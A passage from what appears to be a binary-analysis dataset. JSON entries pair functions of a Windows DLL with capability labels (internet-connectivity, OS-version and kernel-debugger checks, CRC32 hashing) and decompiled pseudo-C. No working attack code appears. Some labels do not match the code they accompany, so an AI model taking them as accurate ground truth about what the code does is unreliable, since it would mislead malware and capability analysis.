0x10;\n            uVar9 = uVar10;\n        } while (uVar7 == 0);\n    }\n    uVar9 = *(arg3 + 1);\n    if ((uVar9 & 0x8000) == 0) {\n        uVar7 = *(arg3 + 4);\n        do {\n            uVar10 = uVar9 * 2;\n            uVar9 = uVar10 | uVar7 >> 0x1f;\n            uVar7 = uVar7 * 2 | *arg3 >> 0x1f;\n            *arg3 = *arg3 * 2;\n            iVar5 = iVar5 + -1;\n            *(arg3 + 4) = uVar7;\n            *(arg3 + 1) = uVar9;\n        } while ((uVar10 & 0x8000) == 0);\n    }\n    *(arg3 + 10) = iVar5;\n    return;\n}\n",
        "token_count": 1311
    },
    "1800306a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800306a8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    ulong *puStack80;\n    ulong var_40h;\n    int64_t var_bp_30h;\n    ulong var_bp_28h;\n    ulong var_bp_20h;\n    ulong var_bp_18h;\n    uint64_t var_8h;\n    \n    var_8h = *0x180040248 ^ auStack136;\n    fcn.1800241bc(&var_40h, arg3);\n    puStack80 = &var_40h;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.18002a3e8(&var_bp_18h, &var_bp_20h, arg2, 0);\n    iVar2 = fcn.18002f5cc(&var_bp_18h, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (var_bp_28h != '\\0') {\n                *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180030786;\n        }\n        if (iVar2 != 2) goto code_r0x000180030773;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (var_bp_28h != '\\0') {\n                *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180030786;\n        }\ncode_r0x000180030773:\n        if (var_bp_28h != '\\0') {\n            *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n        }\n        goto code_r0x000180030786;\n    }\n    if (var_bp_28h != '\\0') {\n        *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n    }\ncode_r0x000180030786:\n    fcn.180023980(var_8h ^ auStack136);\n    return;\n}\n",
        "token_count": 584
    },
    "1800307a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800307a8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar auStack136 [32];\n    uint uStack104;\n    uint uStack96;\n    uint uStack88;\n    ulong *puStack80;\n    ulong var_40h;\n    int64_t var_bp_30h;\n    ulong var_bp_28h;\n    ulong var_bp_20h;\n    ulong var_bp_18h;\n    uint64_t var_8h;\n    \n    var_8h = *0x180040248 ^ auStack136;\n    fcn.1800241bc(&var_40h, arg3);\n    puStack80 = &var_40h;\n    uStack88 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uVar1 = fcn.18002a3e8(&var_bp_18h, &var_bp_20h, arg2, 0);\n    iVar2 = fcn.18002fb98(&var_bp_18h, arg1);\n    if ((uVar1 & 3) == 0) {\n        if (iVar2 == 1) {\n            if (var_bp_28h != '\\0') {\n                *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180030886;\n        }\n        if (iVar2 != 2) goto code_r0x000180030873;\n    }\n    else if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            if (var_bp_28h != '\\0') {\n                *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180030886;\n        }\ncode_r0x000180030873:\n        if (var_bp_28h != '\\0') {\n            *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n        }\n        goto code_r0x000180030886;\n    }\n    if (var_bp_28h != '\\0') {\n        *(var_bp_30h + 200) = *(var_bp_30h + 200) & 0xfffffffd;\n    }\ncode_r0x000180030886:\n    fcn.180023980(var_8h ^ auStack136);\n    return;\n}\n",
        "token_count": 583
    },
    "18001f59": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.18001f590(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    code *pcVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint uStackX16;\n    uchar auStack424 [32];\n    uint uStack392;\n    ulong uStack384;\n    uchar auStack368 [40];\n    uchar auStack328 [40];\n    uchar auStack288 [48];\n    uint *puStack240;\n    uchar auStack232 [8];\n    int32_t iStack224;\n    uint uStack220;\n    int16_t **ppiStack216;\n    int16_t **ppiStack208;\n    uchar auStack200 [48];\n    uchar uStack152;\n    uchar uStack151;\n    char cStack150;\n    uchar auStack144 [40];\n    uchar *puStack104;\n    uchar uStack96;\n    uchar uStack95;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint32_t uStack40;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180040248 ^ auStack424;\n    puStack240 = fcn.180015b40(0xc);\n    uStackX16 = arg2;\n    *puStack240 = uStackX16;\n    uVar4 = fcn.180015b40(0x4000);\n    *(puStack240 + 1) = uVar4;\n    fcn.180001590(*(puStack240 + 1), 0x4000, arg3);\n    fcn.180001000(auStack288, *(puStack240 + 1));\n    uStack220 = fcn.180001180(auStack288);\n    ppiStack216 = fcn.180001190(auStack288);\n    fcn.180007a60(auStack232);\n    uVar6 = 0xffffffffffffffff;\n    piVar9 = *ppiStack216;\n    do {\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        iVar1 = *piVar9;\n        piVar9 = piVar9 + 1;\n    } while (iVar1 != 0);\n    fcn.180009740(auStack232, *ppiStack216, (~uVar6 - 1) * 2 & 0xffffffff, auStack328);\n    iStack224 = 0;\n    cVar2 = fcn.1800208c0(arg1, arg2, *ppiStack216, &iStack224);\n    if (cVar2 == '\\0') {\n        if (iStack224 == 0x67) {\n            uVar6 = 0xffffffffffffffff;\n            piVar9 = *ppiStack216;\n            do {\n                if (uVar6 == 0) break;\n                uVar6 = uVar6 - 1;\n                iVar1 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar1 != 0);\n            if (1 < ~uVar6 - 1) {\n                uVar6 = 0xffffffffffffffff;\n                piVar9 = *ppiStack216;\n                do {\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                    iVar1 = *piVar9;\n                    piVar9 = piVar9 + 1;\n                } while (iVar1 != 0);\n                iVar3 = fcn.180031b40(*ppiStack216 + (~uVar6 - 3), 0x180038874);\n                if (iVar3 != 0) {\n                    uVar6 = 0xffffffffffffffff;\n                    piVar9 = *ppiStack216;\n                    do {\n                        if (uVar6 == 0) break;\n                        uVar6 = uVar6 - 1;\n                        iVar1 = *piVar9;\n                        piVar9 = piVar9 + 1;\n                    } while (iVar1 != 0);\n                    iVar3 = fcn.180031b40(*ppiStack216 + (~uVar6 - 3), 0x18003887c);\n                    if (iVar3 != 0) {\n                        cVar2 = fcn.18001efd0(arg1, puStack240);\n                        if (cVar2 != '\\0') {\n                            fcn.180001000(auStack200, *(puStack240 + 1));\n                            ppiStack208 = fcn.180001190(auStack200);\n                            fcn.1800011f0(auStack328, 0x21);\n                            uVar6 = 0xffffffffffffffff;\n                            piVar9 = *ppiStack208;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar1 = *piVar9;\n                                piVar9 = piVar9 + 1;\n                            } while (iVar1 != 0);\n                            fcn.180009740(auStack232, *ppiStack208, (~uVar6 - 1) * 2 & 0xffffffff, auStack328);\n                            cVar2 = fcn.1800208c0(arg1, arg2, *ppiStack208, &iStack224);\n                            if (cVar2 == '\\0') {\n                                uStack152 = 0;\n                                fcn.180001120(auStack200);\n                                fcn.180007ac0(auStack232);\n                                fcn.180001120(auStack288);\n                                goto code_r0x00018001fab7;\n                            }\n                            fcn.180001120(auStack200);\n                        }\n                        goto code_r0x00018001f908;\n                    }\n                }\n            }\n        }\n        uStack151 = 0;\n        fcn.180007ac0(auStack232);\n        fcn.180001120(auStack288);\n    }\n    else {\ncode_r0x00018001f908:\n        puStack104 = auStack144;\n        uStack64 = fcn.18000b740(puStack104, auStack328);\n        uStack56 = fcn.18000e140(auStack368, uStack64);\n        uStack48 = uStack56;\n        uVar4 = fcn.1800020d0(uStack56);\n        puVar8 = puStack240;\n        cVar2 = fcn.18001f3e0(arg1, puStack240, uVar4);\n        cStack150 = cVar2 == '\\0';\n        uStack40 = cStack150;\n        fcn.180001ef0(auStack368, puVar8);\n        if (cStack150 == '\\0') {\n            if (**ppiStack216 == 0x5f) {\n                pcVar5 = fcn.18001e5f0(0x180038888);\n                uStack384 = 0;\n                uStack392 = 0;\n                (*pcVar5)(0, 0, 0x180021940, puStack240);\n            }\n            else {\n                puVar8 = puStack240;\n                puVar10 = auStack88;\n                for (iVar7 = 0xc; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar10 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                fcn.180021720(arg1, auStack88);\n                fcn.180015b80(puStack240 + 1);\n                fcn.180015b80(&puStack240);\n            }\n            uStack95 = 1;\n            fcn.180007ac0(auStack232);\n            fcn.180001120(auStack288);\n        }\n        else {\n            uStack96 = 0;\n            fcn.180007ac0(auStack232);\n            fcn.180001120(auStack288);\n        }\n    }\ncode_r0x00018001fab7:\n    fcn.180023980(uStack32 ^ auStack424);\n    return;\n}\n",
        "token_count": 1850
    },
    "18000f89": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong fcn.18000f890(ulong arg1, uint64_t arg2)\n\n{\n    fcn.180001ef0(arg1, arg2);\n    if ((arg2 & 1) != 0) {\n        fcn.180023e94(arg1);\n    }\n    return arg1;\n}\n",
        "token_count": 68
    },
    "18002b35": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Removing unreachable block (ram,0x00018002b7ce)\n// WARNING: Removing unreachable block (ram,0x00018002b7ac)\n// WARNING: Removing unreachable block (ram,0x00018002b914)\n// WARNING: Removing unreachable block (ram,0x00018002b91d)\n// WARNING: Removing unreachable block (ram,0x00018002b925)\n\nvoid fcn.18002b35c(int64_t arg1, uint16_t *arg2, ulong arg3, int32_t **arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    int32_t *piVar11;\n    code *pcVar12;\n    uint64_t uVar13;\n    int32_t *piVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    int32_t *piVar17;\n    uint16_t *puVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    uint16_t uVar21;\n    int64_t arg3_00;\n    uint32_t uVar22;\n    uint64_t uVar23;\n    ulong var_1cfh;\n    ulong var_3d0h;\n    uchar auStack1304 [32];\n    int32_t *piStack1272;\n    uint uStack1264;\n    int64_t *piStack1256;\n    uint32_t uStack1240;\n    uint32_t uStack1236;\n    uint32_t uStack1232;\n    int32_t **ppiStack1224;\n    int32_t iStack1216;\n    int32_t iStack1212;\n    ushort auStack1208 [2];\n    uint16_t auStack1204 [2];\n    uchar uStack1200;\n    uchar uStack1199;\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    uint uStack1188;\n    int64_t iStack1184;\n    uint16_t *puStack1176;\n    uint uStack1168;\n    int64_t aiStack1160 [2];\n    int64_t iStack1144;\n    char cStack1136;\n    int32_t *piStack1128;\n    int32_t *piStack1120;\n    int32_t *apiStack1112 [2];\n    uint16_t uStack1096;\n    int32_t aiStack585 [112];\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_70h;\n    ulong var_60h;\n    ulong var_bp_58h;\n    ulong var_bp_50h;\n    ulong var_bp_48h;\n    uint64_t var_bp_40h;\n    ulong var_30h;\n    \n    var_bp_40h = *0x180040248 ^ auStack1304;\n    uStack1188 = 0;\n    uVar20 = 0;\n    bVar7 = false;\n    bVar6 = false;\n    bVar5 = false;\n    bVar4 = false;\n    bVar3 = false;\n    bVar2 = false;\n    bVar1 = false;\n    iStack1212 = 0;\n    uVar15 = 0;\n    uStack1236 = 0;\n    uStack1232 = 0;\n    iStack1192 = 0;\n    iStack1216 = 0;\n    ppiStack1224 = arg4;\n    iStack1184 = arg1;\n    puStack1176 = arg2;\n    fcn.1800241bc(aiStack1160, arg3);\n    piStack1120 = fcn.180025ba4();\n    uVar13 = 0;\n    if ((arg1 == 0) || (puStack1176 == NULL)) {\ncode_r0x00018002b3dc:\n        puVar10 = fcn.180025ba4();\n        *puVar10 = 0x16;\n        fcn.180026334();\n        if (cStack1136 != '\\0') {\n            *(iStack1144 + 200) = *(iStack1144 + 200) & 0xfffffffd;\n        }\n    }\n    else {\n        uVar21 = *puStack1176;\n        uStack1240 = 0;\n        piStack1128 = NULL;\n        piVar14 = piStack1120;\n        uVar16 = uVar13;\n        uVar23 = uVar13;\n        piVar17 = *0x180040268;\n        puVar18 = puStack1176;\n        while (*0x180040268 = piVar17,  uVar21 != 0) {\n            uVar19 = 0;\n            puStack1176 = puVar18 + 1;\n            if (uVar16 < 0) break;\n            uVar22 = 0;\n            if (uVar21 - 0x20 < 0x59) {\n                uVar22 = *(uVar21 + 0x180037050) & 0xf;\n            }\n            uStack1196 = *(uVar13 + uVar22 * 8 + 0x180037070) >> 4;\n            uVar13 = uStack1196;\n            if (uStack1196 == 0) {\ncode_r0x00018002bcba:\n                iStack1216 = 1;\n                fcn.18002b234(uVar21, iStack1184, &uStack1240);\n                uVar16 = uStack1240;\ncode_r0x00018002bdf2:\n                uVar13 = uStack1196;\n                puVar18 = puStack1176;\n            }\n            else if (uStack1196 == 1) {\n                uVar15 = 0xffffffff;\n                uStack1168 = 0;\n                iStack1192 = 0;\n                iStack1212 = 0;\n                uStack1232 = 0;\n                uVar20 = 0;\n                bVar7 = false;\n                bVar6 = false;\n                bVar5 = false;\n                bVar4 = false;\n                bVar3 = false;\n                bVar2 = false;\n                bVar1 = false;\n                uStack1236 = 0xffffffff;\n                iStack1216 = 0;\n                puVar18 = puStack1176;\n            }\n            else if (uStack1196 == 2) {\n                if (uVar21 == 0x20) {\n                    bVar7 = true;\n                    puVar18 = puStack1176;\n                }\n                else if (uVar21 == 0x23) {\n                    bVar6 = true;\n                    puVar18 = puStack1176;\n                }\n                else if (uVar21 == 0x2b) {\n                    bVar3 = true;\n                    puVar18 = puStack1176;\n                }\n                else if (uVar21 == 0x2d) {\n                    uVar20 = uVar20 | 4;\n                    puVar18 = puStack1176;\n                }\n                else {\n                    puVar18 = puStack1176;\n                    if (uVar21 == 0x30) {\n                        uVar20 = uVar20 | 8;\n                    }\n                }\n            }\n            else if (uStack1196 == 3) {\n                if (uVar21 == 0x2a) {\n                    iStack1212 = *arg4;\n                    arg4 = arg4 + 1;\n                    puVar18 = puStack1176;\n                    ppiStack1224 = arg4;\n                    if (iStack1212 < 0) {\n                        uVar20 = uVar20 | 4;\n                        iStack1212 = -iStack1212;\n                    }\n                }\n                else {\n                    iStack1212 = (uVar21 - 0x30) + iStack1212 * 10;\n                    puVar18 = puStack1176;\n                }\n            }\n            else if (uStack1196 == 4) {\n                uStack1236 = 0;\n                puVar18 = puStack1176;\n                uVar15 = 0;\n            }\n            else if (uStack1196 == 5) {\n                if (uVar21 == 0x2a) {\n                    uStack1236 = *arg4;\n                    arg4 = arg4 + 1;\n                    puVar18 = puStack1176;\n                    uVar15 = uStack1236;\n                    ppiStack1224 = arg4;\n                    if (uStack1236 < 0) {\n                        uStack1236 = 0xffffffff;\n                        uVar15 = 0xffffffff;\n                    }\n                }\n                else {\n                    uStack1236 = (uVar21 - 0x30) + uVar15 * 10;\n                    puVar18 = puStack1176;\n                    uVar15 = uStack1236;\n                }\n            }\n            else if (uStack1196 == 6) {\n                if (uVar21 == 0x49) {\n                    bVar5 = true;\n                    if ((*puStack1176 == 0x36) && (puVar18[2] == 0x34)) {\n                        bVar5 = true;\n                        puVar18 = puVar18 + 3;\n                    }\n                    else if ((*puStack1176 == 0x33) && (puVar18[2] == 0x32)) {\n                        bVar5 = false;\n                        puVar18 = puVar18 + 3;\n                    }\n                    else {\n                        puVar18 = puStack1176;\n                        if ((((*puStack1176 != 100) && (*puStack1176 != 0x69)) && (*puStack1176 != 0x6f)) &&\n                           (((*puStack1176 != 0x75 && (*puStack1176 != 0x78)) && (*puStack1176 != 0x58)))) {\n                            uStack1196 = 0;\n                            goto code_r0x00018002bcba;\n                        }\n                    }\n                }\n                else if (uVar21 == 0x68) {\n                    uVar20 = uVar20 | 0x20;\n                    puVar18 = puStack1176;\n                }\n                else if (uVar21 == 0x6c) {\n                    if (*puStack1176 == 0x6c) {\n                        bVar2 = true;\n                        puVar18 = puVar18 + 2;\n                    }\n                    else {\n                        uVar20 = uVar20 | 0x10;\n                        puVar18 = puStack1176;\n                    }\n                }\n                else {\n                    puVar18 = puStack1176;\n                    if (uVar21 == 0x77) {\n                        uVar20 = uVar20 | 0x800;\n                    }\n                }\n            }\n            else {\n                puVar18 = puStack1176;\n                if (uStack1196 == 7) {\n                    if (uVar21 < 0x65) {\n                        if (uVar21 == 100) {\ncode_r0x00018002b812:\n                            bVar4 = true;\ncode_r0x00018002b816:\n                            iVar9 = 10;\ncode_r0x00018002b826:\n                            if ((bVar5) || (bVar2)) {\n                                piVar14 = *arg4;\n                            }\n                            else if ((uVar20 & 0x20) == 0) {\n                                if (bVar4) {\n                                    piVar14 = *arg4;\n                                }\n                                else {\n                                    piVar14 = *arg4;\n                                }\n                            }\n                            else if (bVar4) {\n                                piVar14 = *arg4;\n                            }\n                            else {\n                                piVar14 = *arg4;\n                            }\n                            arg4 = arg4 + 1;\n                            if ((bVar4) && (piVar14 < 0)) {\n                                piVar14 = -piVar14;\n                                bVar1 = true;\n                            }\n                            if ((!bVar5) && (!bVar2)) {\n                                piVar14 = piVar14 & 0xffffffff;\n                            }\n                            if (uVar15 < 0) {\n                                uVar15 = 1;\n                            }\n                            else {\n                                uVar20 = uVar20 & 0xfffffff7;\n                                if (0x200 < uVar15) {\n                                    uVar15 = 0x200;\n                                }\n                            }\n                            piVar17 = aiStack585;\n                            uStack1232 = -(piVar14 != NULL) & uStack1232;\n                            while ((uStack1236 = uVar15 - 1,  0 < uVar15 || (piVar14 != NULL))) {\n                                uVar15 = piVar14 % iVar9 + 0x30;\n                                cVar8 = uVar15;\n                                if (0x39 < uVar15) {\n                                    cVar8 = cVar8 + uStack1188;\n                                }\n                                *piVar17 = cVar8;\n                                piVar17 = piVar17 + -1;\n                                piVar14 = piVar14 / iVar9;\n                                uVar15 = uStack1236;\n                            }\n                            uVar16 = uStack1240;\n                            piVar14 = piVar17 + 1;\n                            uVar23 = (*0x20 + -0x249) - piVar17;\n                            ppiStack1224 = arg4;\n                        }\n                        else if (uVar21 == 0x41) {\ncode_r0x00018002b6bd:\n                            uStack1168 = 1;\n                            uVar21 = uVar21 + 0x20;\ncode_r0x00018002b6cd:\n                            piVar14 = &uStack1096;\n                            if (uVar15 < 0) {\n                                uVar22 = 6;\ncode_r0x00018002b6e6:\n                                piVar14 = &uStack1096;\n                                iVar9 = 0x200;\n                                uStack1236 = uVar22;\n                            }\n                            else if (uVar15 == 0) {\n                                iVar9 = 0x200;\n                                if (uVar21 == 0x67) {\n                                    uVar22 = 1;\n                                    goto code_r0x00018002b6e6;\n                                }\n                            }\n                            else {\n                                uVar22 = 0xa3;\n                                if (0x200 < uVar15) {\n                                    uVar15 = 0x200;\n                                }\n                                iVar9 = 0x200;\n                                uStack1236 = uVar15;\n                                if (0xa3 < uVar15) {\n                                    iVar9 = uVar15 + 0x15d;\n                                    piVar14 = fcn.1800271b4(iVar9);\n                                    piStack1128 = piVar14;\n                                    if (piVar14 == NULL) goto code_r0x00018002b6e6;\n                                }\n                            }\n                            uVar15 = uStack1236;\n                            apiStack1112[0] = *arg4;\n                            arg4 = arg4 + 1;\n                            ppiStack1224 = arg4;\n                            pcVar12 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180041160);\n                            piStack1256 = aiStack1160;\n                            uStack1264 = uStack1168;\n                            piStack1272 = piStack1272 & 0xffffffff00000000 | uVar15;\n                            (*pcVar12)(apiStack1112, piVar14, iVar9, uVar21);\n                            if ((bVar6) && (uVar15 == 0)) {\n                                pcVar12 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180041178);\n                                (*pcVar12)(piVar14);\n                            }\n                            if ((uVar21 == 0x67) && (!bVar6)) {\n                                pcVar12 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180041170);\n                                (*pcVar12)(piVar14);\n                            }\n                            if (*piVar14 == 0x2d) {\n                                bVar1 = true;\n                                piVar14 = piVar14 + 1;\n                            }\n                            bVar4 = true;\n                            uVar15 = fcn.180025e20(piVar14);\n                            uVar16 = uStack1240;\n                            uVar23 = uVar15;\n                        }\n                        else if (uVar21 == 0x43) {\n                            if ((uVar20 & 0x830) == 0) {\n                                uVar20 = uVar20 | 0x20;\n                            }\ncode_r0x00018002b654:\n                            auStack1204[0] = *arg4;\n                            arg4 = arg4 + 1;\n                            iStack1216 = 1;\n                            ppiStack1224 = arg4;\n                            if ((uVar20 & 0x20) == 0) {\n                                uStack1096 = auStack1204[0];\n                            }\n                            else {\n                                uStack1200 = auStack1204[0];\n                                uStack1199 = 0;\n                                iVar9 = fcn.18002f184(&uStack1096, &uStack1200, *(aiStack1160[0] + 0x10c), aiStack1160);\n                                if (iVar9 < 0) {\n                                    iStack1192 = 1;\n                                }\n                            }\n                            uVar23 = 1;\n                            piVar14 = &uStack1096;\n                        }\n                        else {\n                            if ((uVar21 == 0x45) || (uVar21 == 0x47)) goto code_r0x00018002b6bd;\n                            if (uVar21 == 0x53) {\n                                if ((uVar20 & 0x830) == 0) {\n                                    uVar20 = uVar20 | 0x20;\n                                }\ncode_r0x00018002b5af:\n                                piVar11 = *arg4;\n                                if (uStack1236 == 0xffffffff) {\n                                    uVar15 = 0x7fffffff;\n                                }\n                                arg4 = arg4 + 1;\n                                piVar14 = piVar11;\n                                ppiStack1224 = arg4;\n                                if ((uVar20 & 0x20) == 0) {\n                                    iStack1216 = 1;\n                                    if (piVar11 == NULL) {\n                                        piVar11 = *0x180040270;\n                                        piVar14 = *0x180040270;\n                                    }\n                                    for (; (uVar15 != 0 && (uVar15 = uVar15 - 1,  *piVar11 != 0)); piVar11 = piVar11 + 2\n                                        ) {\n                                    }\n                                    uVar23 = piVar11 - piVar14 >> 1 & 0xffffffff;\n                                }\n                                else {\n                                    if (piVar11 == NULL) {\n                                        piVar14 = piVar17;\n                                    }\n                                    piVar17 = piVar14;\n                                    uVar23 = uVar19;\n                                    if (0 < uVar15) {\n                                        do {\n                                            uVar23 = uVar19;\n                                            if (*piVar17 == 0) break;\n                                            iVar9 = fcn.18002b168(*piVar17, aiStack1160);\n                                            if (iVar9 != 0) {\n                                                piVar17 = piVar17 + 1;\n                                            }\n                                            uVar22 = uVar19 + 1;\n                                            uVar19 = uVar22;\n                                            piVar17 = piVar17 + 1;\n                                            uVar23 = uVar19;\n                                        } while (uVar22 < uVar15);\n                                    }\n                                    uVar16 = uStack1240;\n                                }\n                            }\n                            else {\n                                if (uVar21 == 0x58) {\ncode_r0x00018002b792:\n                                    uStack1188 = 7;\ncode_r0x00018002b797:\n                                    iVar9 = 0x10;\n                                    goto code_r0x00018002b826;\n                                }\n                                if (uVar21 == 0x5a) {\n                                    piVar11 = *arg4;\n                                    arg4 = arg4 + 1;\n                                    ppiStack1224 = arg4;\n                                    if ((piVar11 == NULL) || (piVar14 = *(piVar11 + 2),  piVar14 == NULL)) {\n                                        uVar23 = fcn.180025e20(piVar17);\n                                        piVar14 = piVar17;\n                                    }\n                                    else if (uVar20 >> 0xb == 0) {\n                                        uVar23 = *piVar11;\n                                        iStack1216 = 0;\n                                    }\n                                    else {\n                                        iStack1216 = 1;\n                                        uVar23 = *piVar11 / 2;\n                                    }\n                                }\n                                else {\n                                    if (uVar21 == 0x61) goto code_r0x00018002b6cd;\n                                    if (uVar21 == 99) goto code_r0x00018002b654;\n                                }\n                            }\n                        }\ncode_r0x00018002b615:\n                        arg3_00 = iStack1184;\n                        if (iStack1192 == 0) {\n                            if (bVar4) {\n                                if (bVar1) {\n                                    auStack1208[0] = 0x2d;\n                                }\n                                else {\n                                    if (!bVar3) {\n                                        if (bVar7) {\n                                            auStack1208[0] = 0x20;\n                                            uStack1232 = 1;\n                                        }\n                                        goto code_r0x00018002ba78;\n                                    }\n                                    auStack1208[0] = 0x2b;\n                                }\n                                uStack1232 = 1;\n                            }\ncode_r0x00018002ba78:\n                            uVar15 = uStack1232;\n                            uVar22 = (iStack1212 - uVar23) - uStack1232;\n                            if ((uVar20 & 0xc) == 0) {\n                                fcn.18002b26c(0x20, uVar22, iStack1184, &uStack1240);\n                            }\n                            piVar17 = piStack1120;\n                            piStack1272 = piStack1120;\n                            fcn.18002b2c0(auStack1208, uVar15, arg3_00, &uStack1240);\n                            if (((uVar20 & 8) != 0) && ((uVar20 & 4) == 0)) {\n                                fcn.18002b26c(0x30, uVar22, arg3_00, &uStack1240);\n                            }\n                            if ((iStack1216 == 0) && (0 < uVar23)) {\n                                uVar13 = uVar23 & 0xffffffff;\n                                piVar17 = piVar14;\n                                do {\n                                    uVar15 = uVar13 - 1;\n                                    uVar13 = uVar15;\n                                    iVar9 = fcn.18002f184(auStack1204, piVar17, *(aiStack1160[0] + 0x10c), aiStack1160);\n                                    if (iVar9 < 1) {\n                                        uVar16 = 0xffffffff;\n                                        uStack1240 = 0xffffffff;\n                                        arg3_00 = iStack1184;\n                                        goto code_r0x00018002bb6b;\n                                    }\n                                    fcn.18002b234(auStack1204[0], iStack1184, &uStack1240);\n                                    piVar17 = piVar17 + iVar9;\n                                    arg3_00 = iStack1184;\n                                } while (0 < uVar15);\n                            }\n                            else {\n                                piStack1272 = piVar17;\n                                fcn.18002b2c0(piVar14, uVar23 & 0xffffffff, arg3_00, &uStack1240);\n                            }\n                            uVar16 = uStack1240;\ncode_r0x00018002bb6b:\n                            arg4 = ppiStack1224;\n                            if ((-1 < uVar16) && ((uVar20 & 4) != 0)) {\n                                fcn.18002b26c(0x20, uVar22, arg3_00, &uStack1240);\n                                uVar16 = uStack1240;\n                                arg4 = ppiStack1224;\n                            }\n                        }\n                    }\n                    else {\n                        if (uVar21 < 0x65) goto code_r0x00018002b615;\n                        if (uVar21 < 0x68) goto code_r0x00018002b6cd;\n                        if (uVar21 == 0x69) goto code_r0x00018002b812;\n                        if (uVar21 != 0x6e) {\n                            if (uVar21 != 0x6f) {\n                                if (uVar21 == 0x70) {\n                                    uVar15 = 0x10;\n                                    bVar5 = true;\n                                    goto code_r0x00018002b792;\n                                }\n                                if (uVar21 == 0x73) goto code_r0x00018002b5af;\n                                if (uVar21 != 0x75) {\n                                    if (uVar21 == 0x78) {\n                                        uStack1188 = 0x27;\n                                        goto code_r0x00018002b797;\n                                    }\n                                    goto code_r0x00018002b615;\n                                }\n                                goto code_r0x00018002b816;\n                            }\n                            iVar9 = 8;\n                            goto code_r0x00018002b826;\n                        }\n                        piVar17 = *arg4;\n                        ppiStack1224 = arg4 + 1;\n                        iVar9 = fcn.18002e65c();\n                        if (iVar9 == 0) goto code_r0x00018002b3dc;\n                        if ((uVar20 & 0x20) == 0) {\n                            *piVar17 = uVar16;\n                        }\n                        else {\n                            *piVar17 = uVar16;\n                        }\n                        iStack1192 = 1;\n                        arg4 = arg4 + 1;\n                    }\n                    uVar15 = uStack1236;\n                    if (piStack1128 != NULL) {\n                        fcn.180024024(piStack1128);\n                        piStack1128 = NULL;\n                        uVar15 = uStack1236;\n                    }\n                    goto code_r0x00018002bdf2;\n                }\n            }\n            piVar17 = *0x180040268;\n            uVar21 = *puVar18;\n        }\n        if (cStack1136 != '\\0') {\n            *(iStack1144 + 200) = *(iStack1144 + 200) & 0xfffffffd;\n        }\n    }\n    fcn.180023980(var_bp_40h ^ auStack1304);\n    return;\n}\n",
        "token_count": 5898
    },
    "18002d79": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
